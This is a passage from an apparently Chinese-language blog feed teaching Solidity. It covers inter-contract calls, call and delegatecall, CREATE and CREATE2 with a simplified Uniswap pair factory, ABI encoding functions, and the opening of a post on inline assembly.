_x = 0; // 状态变量_x</span><br><span class="line">    // 收到eth的事件，记录amount和gas</span><br><span class="line">    event Log(uint amount, uint gas);</span><br><span class="line">    </span><br><span class="line">    // 返回合约ETH余额</span><br><span class="line">    function getBalance() view public returns(uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 可以调整状态变量_x的函数，并且可以往合约转ETH (payable)</span><br><span class="line">    function setX(uint256 x) external payable&#123;</span><br><span class="line">        _x = x;</span><br><span class="line">        // 如果转入ETH，则释放Log事件</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            emit Log(msg.value, gasleft());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取_x</span><br><span class="line">    function getX() external view returns(uint x)&#123;</span><br><span class="line">        x = _x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约地址"><a href="#传入合约地址" class="headerlink" title="传入合约地址"></a>传入合约地址</h5><p>可以利用合约的地址和合约代码（接口）来创建合约的引用：<code>_name(_Address)</code>，其中<code>_Name</code>是合约名，<code>_Address</code>是合约地址。然后用合约的引用来调用合约中的函数。如：<code>_Name(_Address).func()</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address _Address, uint256 x) external &#123;</span><br><span class="line">OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="传入合约变量"><a href="#传入合约变量" class="headerlink" title="传入合约变量"></a>传入合约变量</h5><p>可以直接在函数里传入合约的引用，只需要把上面参数的<code>address</code>类型更改目标合约名，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callgetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建合约变量"><a href="#创建合约变量" class="headerlink" title="创建合约变量"></a>创建合约变量</h5><p>可以通过创建合约变量，然后通过合约变量来调用目标函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uin x)&#123;</span><br><span class="line">OtherContract oc = OtherContract(_Address);</span><br><span class="line">x = oc.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="调用合约并发送ETH"><a href="#调用合约并发送ETH" class="headerlink" title="调用合约并发送ETH"></a>调用合约并发送ETH</h5><p>如果目标合约的函数是<code>payable</code>的，那么我们可以通过调用它给合约进行转账：<code>_Name(_Address).func&#123;value:_Value&#125;()</code></p><blockquote><p>在小于0.6.2的版本为：Name(ContractAddress).value(Value).gas(Gas)()</p></blockquote><h3 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h3><p><code>call</code> 是<code>address</code>类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, data)</code>，分别对应<code>call</code>是否成功以及目标函数的返回值。</p><ul><li><code>call</code>是<code>solidity</code>官方推荐的通过触发<code>fallback</code>或<code>receive</code>函数发送<code>ETH</code>的方法。</li><li>不推荐用<code>call</code>来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数。</li><li>当我们不知道对方合约的源代码或<code>ABI</code>，就没法生成合约变量；这时，我们仍可以通过<code>call</code>调用对方合约的函数。</li></ul><p>规则：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call(二进制编码)</span><br></pre></td></tr></table></figure><p>二进制编码可以利用<code>abi.encodeWithSignature</code>获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;，具体参数)</span><br></pre></td></tr></table></figure><p><code>call</code>在调用合约时也可以指定交易发送的<code>value</code>和<code>gas</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.call&#123;value:amount, gas:gasAmount&#125;(abi.encodeWithSignature(&quot;funcSig&quot;,params))</span><br></pre></td></tr></table></figure><p>利用<code>call</code>调用<code>OtherContrat</code>合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address payable _addr, uint256 x) public payable &#123;</span><br><span class="line">(bool success, bytes memory data) = _addr.call&#123;value:sg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;,x)</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果利用<code>call</code>调用合约中不存在的函数，那么目标合约中的<code>fallback</code>函数会被触发</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callNonExist(address _addr) external&#123;</span><br><span class="line">    // call getX()</span><br><span class="line">    (bool success, bytes memory data) = _addr.call(</span><br><span class="line">        abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时<code>call</code>还是会调用成功，并返回<code>success</code>，但是其实调用的是目标合约中的<code>fallback</code>函数</p><h3 id="Delegetecall"><a href="#Delegetecall" class="headerlink" title="Delegetecall"></a>Delegetecall</h3><p><code>delegatecall</code>也是 solidity 中 <code>address</code> 类型的低级成员函数。</p><p>当用户<code>A</code>通过合约<code>B</code>来<code>call</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，<code>语境</code>(<code>Context</code>，可以理解为包含变量和状态的环境)也是合约<code>C</code>的：<code>msg.sender</code>是<code>B</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>C</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103211841263.png" alt="image-20221103211841263"></p><p>而当用户<code>A</code>通过合约<code>B</code>来<code>delegatecall</code>合约<code>C</code>的时候，执行的是合约<code>C</code>的函数，但是<code>语境</code>仍是合约<code>B</code>的：<code>msg.sender</code>是<code>A</code>的地址，并且如果函数改变一些状态变量，产生的效果会作用于合约<code>B</code>的变量上。</p><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221103212047007.png" alt="image-20221103212047007"></p><p>相当于把合约C的代码拉过来在B的环境下执行。</p><p>规则也与<code>call</code>类似：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contractAddress.delegatecall(二进制编码)</span><br></pre></td></tr></table></figure><p>与<code>call</code>不同的是，<code>delegatecall</code>在调用合约时可以指定交易发送的<code>gas</code>，但不能指定发送的<code>ETH</code>数额。</p><p>**<font color=red>注意</font>**：<code>delegatecall</code>有安全隐患，使用时要保证当前合约和目标合约的状态变量存储结构相同，并且目标合约安全，不然会造成资产损失。</p><p>使用<code>delegatecall</code>的应用场景：</p><ol><li>代理合约（<code>Proxy Contract</code>）：将智能合约的存储合约和逻辑合约分开：代理合约（<code>Proxy Contract</code>）存储所有相关的变量，并且保存逻辑合约的地址；所有函数存在逻辑合约（<code>Logic Contract</code>）里，通过<code>delegatecall</code>执行。当升级时，只需要将代理合约指向新的逻辑合约即可。</li><li>EIP-2535 Diamonds（钻石）：钻石是一个支持构建可在生产中扩展的模块化智能合约系统的标准。钻石是具有多个实施合同的代理合同。 更多信息请查看：<a href="https://eip2535diamonds.substack.com/p/introduction-to-the-diamond-standard">钻石标准简介</a>。</li></ol><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 被调用的合约C</span><br><span class="line">contract C &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br><span class="line"></span><br><span class="line">    function setVars(uint _num) public payable &#123;</span><br><span class="line">        num = _num;</span><br><span class="line">        sender = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发起调用的合约：</p><p>首先，合约<code>B</code>必须和目标合约<code>C</code>的变量存储布局必须相同，两个变量，并且顺序为<code>num</code>和<code>sender</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract B &#123;</span><br><span class="line">    uint public num;</span><br><span class="line">    address public sender;</span><br></pre></td></tr></table></figure><p><code>callSetVars</code>函数通过<code>call</code>来调用<code>setVars</code>。它有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 通过call来调用C的setVars()函数，将改变合约C里的状态变量</span><br><span class="line">   function callSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">       // call setVars()</span><br><span class="line">       (bool success, bytes memory data) = _addr.call(</span><br><span class="line">           abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>delegatecallSetVars</code>函数通过<code>delegatecall</code>来调用<code>setVars</code>。与上面的<code>callSetVars</code>函数相同，有两个参数<code>_addr</code>和<code>_num</code>，分别对应合约<code>C</code>的地址和<code>setVars</code>的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    // 通过delegatecall来调用C的setVars()函数，将改变合约B里的状态变量</span><br><span class="line">    function delegatecallSetVars(address _addr, uint _num) external payable&#123;</span><br><span class="line">        // delegatecall setVars()</span><br><span class="line">        (bool success, bytes memory data) = _addr.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;setVars(uint256)&quot;, _num)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="在合约中创建新合约"><a href="#在合约中创建新合约" class="headerlink" title="在合约中创建新合约"></a><font color=purple>在合约中创建新合约</font></h3><p>在以太坊链上，用户（外部账户，<code>EOA</code>）可以创建智能合约，智能合约同样也可以创建新的智能合约。去中心化交易所<code>uniswap</code>就是利用工厂合约（<code>Factory</code>）创建了无数个币对合约（<code>Pair</code>）。</p><p>有俩种方法可以创建智能合约</p><h5 id="Create"><a href="#Create" class="headerlink" title="Create:"></a><font color=red><strong>Create:</strong></font></h5><p>new 一个合约，并传入新合约构造函数所需的参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>其中<code>Contract</code>是要创建的合约名，<code>x</code>是合约对象（地址），如果构造函数是<code>payable</code>，可以创建时转入<code>_value</code>数量的<code>ETH</code>，<code>params</code>是新合约构造函数的参数。</p><p><code>Uniswap V2</code><a href="https://github.com/Uniswap/v2-core/tree/master/contracts">核心合约</a>中包含两个合约：</p><ol><li>UniswapV2Pair: 币对合约，用于管理币对地址、流动性、买卖。</li><li>UniswapV2Factory: 工厂合约，用于创建新的币对，并管理币对地址。</li></ol><p>下面我们用<code>create</code>方法实现一个极简版的<code>Uniswap</code>：<code>Pair</code>币对合约负责管理币对地址，<code>PairFactory</code>工厂合约用于创建新的币对，并管理币对地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair &#123;</span><br><span class="line">address public factory;   //工厂合约地址</span><br><span class="line">address public token0;//代币1</span><br><span class="line">address public token1;//代币2</span><br><span class="line"></span><br><span class="line">constructor() payable &#123;</span><br><span class="line">factory = msg.sender;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 在部署时由工厂调用一次</span><br><span class="line">function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">require(msg.sender ==factory, &quot;Uniswapv2;FORBIDDEN&quot;);</span><br><span class="line">token0 = _token0;</span><br><span class="line">token1 = _token1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory &#123;</span><br><span class="line">//通过俩个代币地址查Pair地址</span><br><span class="line">mapping(address =&gt; mapping(address =&gt; address)) public getPair;</span><br><span class="line">address[] public allPairs;//保存所有Pair地址</span><br><span class="line"></span><br><span class="line">function createPair(address tokenA, address tokenB) external returns(address pairAddr) &#123;</span><br><span class="line">//创建新合约</span><br><span class="line">Pair pair = new Pair();</span><br><span class="line">//调用新合约的initialize方法</span><br><span class="line">pair.initialize(tokenA, tokenB);</span><br><span class="line">//更新地址map</span><br><span class="line">pairAddr = address(pair);</span><br><span class="line">allPairs.push(pairAddr);</span><br><span class="line">getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有代币地址。</p><p><code>PairFactory</code>合约只有一个<code>createPair</code>函数，根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><p><code>Pair pair = new Pair();</code></p><h5 id="Create2"><a href="#Create2" class="headerlink" title="Create2:"></a><font color=red><strong>Create2:</strong></font></h5><p>CREATE2 操作码使我们在智能合约部署在以太坊网络之前就能预测合约的地址。Uniswap创建Pair合约用的就是CREATE2而不是CREATE.</p><h6 id="create-地址计算"><a href="#create-地址计算" class="headerlink" title="create 地址计算"></a>create 地址计算</h6><p>智能合约可以由其他合约和普通账户利用<code>CREATE</code>操作码创建。 在这两种情况下，新合约的地址都以相同的方式计算：创建者的地址(通常为部署的钱包地址或者合约地址)和<code>nonce</code>(该地址发送交易的总数,对于合约账户是创建的合约总数,每创建一个合约nonce+1))的哈希。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">新合约_Address = hash(创建着地址，nonce)</span><br></pre></td></tr></table></figure><p>创建者地址不会变，但<code>nonce</code>可能会随时间而改变，因此用<code>CREATE</code>创建的合约地址不好预测。</p><h6 id="create2地址计算"><a href="#create2地址计算" class="headerlink" title="create2地址计算"></a>create2地址计算</h6><p><code>CREATE2</code>的目的是为了让合约地址独立于未来的事件。不管未来区块链上发生了什么，你都可以把合约部署在事先计算好的地址上。用<code>CREATE2</code>创建的合约地址由4个部分决定：</p><ul><li><code>0xFF</code>：一个常数，避免和<code>CREATE</code>冲突</li><li>创建者地址</li><li><code>salt</code>（盐）：一个创建者给定的数值</li><li>待部署合约的字节码（<code>bytecode</code>）</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">newAddress = hash(&quot;0xFF&quot;,创建者地址, salt, bytecode)</span><br></pre></td></tr></table></figure><p><code>CREATE2</code> 确保，如果创建者使用 <code>CREATE2</code> 和提供的 <code>salt</code> 部署给定的合约<code>bytecode</code>，它将存储在新地址中。</p><p><strong>create2用法：</strong></p><p>与<strong>create</strong>类似，但是需要多传入一个 <code>salt</code>参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Contract x = new Contract&#123;salt: _salt, value: _value&#125;(params)</span><br></pre></td></tr></table></figure><p>使用 <code>create2</code>实现Uniswap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Pair&#123;</span><br><span class="line">    address public factory; // 工厂合约地址</span><br><span class="line">    address public token0; // 代币1</span><br><span class="line">    address public token1; // 代币2</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        factory = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">        address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">            require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">            // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">            //将tokenA和tokenB按大小排序</span><br><span class="line">            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">            bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">            // 用create2部署新合约</span><br><span class="line">            Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">            // 调用新合约的initialize方法</span><br><span class="line">            pair.initialize(tokenA, tokenB);</span><br><span class="line">            // 更新地址map</span><br><span class="line">            pairAddr = address(pair);</span><br><span class="line">            allPairs.push(pairAddr);</span><br><span class="line">            getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">            getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory2</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有币对地址。</p><p><code>PairFactory2</code>合约只有一个<code>createPair2</code>函数，使用<code>CREATE2</code>根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure><p>就是利用<code>CREATE2</code>创建合约的代码，非常简单，而<code>salt</code>为<code>token1</code>和<code>token2</code>的<code>hash</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br></pre></td></tr></table></figure><p><strong>事先计算Pair的地址</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 提前计算pair合约地址</span><br><span class="line">function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress)&#123;</span><br><span class="line">  require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">  // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">  //将tokenA和tokenB按大小排序</span><br><span class="line">  (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); </span><br><span class="line">  bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">  // 计算合约地址方法 hash()</span><br><span class="line">  predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">  bytes1(0xff),</span><br><span class="line">  address(this),</span><br><span class="line">  salt,</span><br><span class="line">  keccak256(type(Pair).creationCode)</span><br><span class="line">  )))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h3><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><code>Solidity</code>中，<code>ABI编码</code>有4个函数：<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSignature</code>, <code>abi.encodeWithSelector</code>。而<code>ABI解码</code>有1个函数：<code>abi.decode</code>，用于解码<code>abi.encode</code>的数据。</p><h5 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a>abi.encode</h5><p><code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encode(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><strong>abi.encode</strong> 会将每个数据都填充为 32 字节</p><h5 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a>abi.encodePacked</h5><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodePacked(x,addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0x00000000000000000000000000000000000000000000000000000000000000014b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a>abi.encodeWithSignature</h5><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address)&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">   result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><p><code>abi.encode</code>编码结果前加上了4字节的函数选择器。 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</p><h5 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a>abi.encodeWithSelector</h5><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uint x = 1;</span><br><span class="line">address addr = msg.sender;</span><br><span class="line">function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//0xe87082f100000000000000000000000000000000000000000000000000000000000000010000000000000000000000004b20993bc481177ec7e8f571cecae8a9e22c02db</span><br></pre></td></tr></table></figure><h5 id="abi-decode-解码"><a href="#abi-decode-解码" class="headerlink" title="abi.decode(解码)"></a>abi.decode(解码)</h5><p><code>abi.decode</code>用于解码<code>abi.encode</code>生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr) &#123;</span><br><span class="line">      (dx, daddr) = abi.decode(data, (uint, address));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/solidity%E8%BF%9B%E9%98%B6.assets/image-20221108214419590.png" alt="image-20221108214419590"></p><h5 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h5><ol><li><p>在合约开发中，ABI常配合call来实现对合约的底层调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line">   </span><br><span class="line">bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">   </span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li><li><p>ethers.js中常用ABI实现合约的导入和函数调用。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> wavePortalContract = <span class="keyword">new</span> ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Call the getAllWaves method from your Smart Contract</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">const</span> waves = <span class="keyword">await</span> wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure></li><li><p>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0x01-函数重载&quot;&gt;&lt;a href=&quot;#0x01-函数重载&quot; class=&quot;headerlink&quot; title=&quot;0x01 函数重载&quot;&gt;&lt;/a&gt;0x01 函数重载&lt;/h3&gt;&lt;p&gt;函数名相同但输入参数类型不同的函数可以同时存在，他们被视为不同的函数。注意，&lt;cod</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>solidity编写内联汇编</title>
    <link href="https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"/>
    <id>https://banana69.site/2022/08/23/solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/</id>
    <published>2022-08-23T08:51:44.000Z</published>
    <updated>2022-08-24T08:36:32.881Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h3><p>汇编（也称为<em>汇编语言</em>）是指可使用汇编器转换为机器代码的低级编程语言。 汇编语言与物理机或虚拟机绑定，因为它们实现了指令集。 一条指令告诉CPU执行一些基本任务。</p><p>EVM是一个基于栈的虚拟机（stack machine），栈这种数据结构只允许两个操作：压入（PUSH）或弹出（POP）数据。 最后压入的数据位于栈顶，因此将被第一个弹出，这被称为后进先出 （LIFO：Last In, First Out）。栈虚拟机将所有的操作数保存在栈上，其中所有操作数都存储在栈中。 它仍然具有PC（程序计数器）和SP（堆栈指针）的存储器和寄存器，但是所有内容都存储在栈中。</p><p>至于为什么要在solidity中使用内联汇编，有以下几个优点：</p><ul><li><p><strong>细粒度控制</strong></p><p>可以使用操作码直接与EVM进行交互，这使对智能合约要执行的操作可以进行更精细的控制。</p><p>汇编代码还提供了更多仅靠Solidity不能实现的逻辑权限，例如指向特定的内存插槽，当编写合约库文件时，细粒度控制有很大的作用。</p></li><li><p><strong>减少Gas消耗</strong></p><p>在solidity中使用汇编代码还可以节省Gas，如以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function addAssembly(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     assembly &#123;</span><br><span class="line">         let result := add(x, y)</span><br><span class="line">         mstore(0x0, result)</span><br><span class="line">         return(0x0, 32)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> function addSolidity(uint x, uint y) public pure returns (uint) &#123;</span><br><span class="line">     return x + y;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>汇编消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170713555.png" alt="image-20220823170713555"></p><p>solidity消耗的Gas：</p><p><img src="solidity%E7%BC%96%E5%86%99%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96.assets/image-20220823170734917.png" alt="image-20220823170734917"></p><p>可以看到在简单的加操作中汇编代码要比solidity节省Gas，在更为复杂的合约中节约的Gas也会更多。</p></li><li><p>从 string 中读取数据</p><p>使用内联汇编可以在单个操作中从数据<code>string</code>和<code>bytes</code>类型中读取整个字节（256 位）。Solidity-stringutils 通过对被比较的两个字符串的 32 字节块进行减法来使用它进行非常快速的字符串比较。如果没有汇编，必须逐字节执行此操作。</p></li><li><p>一些操作没有在 Solidity 中公开。例如，sha3 操作码采用内存中的一个字节范围进行哈希计算，而同名的 Solidity 函数采用一个字符串。因此，散列字符串的一部分将需要昂贵的字符串复制操作。使用内联汇编，就可以传入一个字符串并仅对需要的位进行哈希处理。</p></li><li><p>Solidity 不支持从返回可变长度类型（如动态数组、字节或字符串）的声明为external 的函数获取返回值，但如果知道预期的长度，则可以使用内联汇编调用它们。</p></li></ul><h3 id="0x02-基本语法"><a href="#0x02-基本语法" class="headerlink" title="0x02 基本语法"></a>0x02 